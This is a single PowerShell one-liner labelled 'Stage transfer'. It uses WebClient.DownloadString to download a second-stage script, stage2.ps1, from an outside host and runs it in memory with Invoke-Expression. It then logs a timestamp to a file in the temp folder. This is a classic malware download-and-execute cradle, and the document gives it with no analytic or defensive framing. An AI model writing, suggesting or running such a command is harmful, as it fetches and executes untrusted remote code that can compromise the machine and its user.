
<# Stage transfer #> Invoke-Expression (New-Object System.Net.WebClient).DownloadString("http://adatum.com/stage2.ps1"); Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
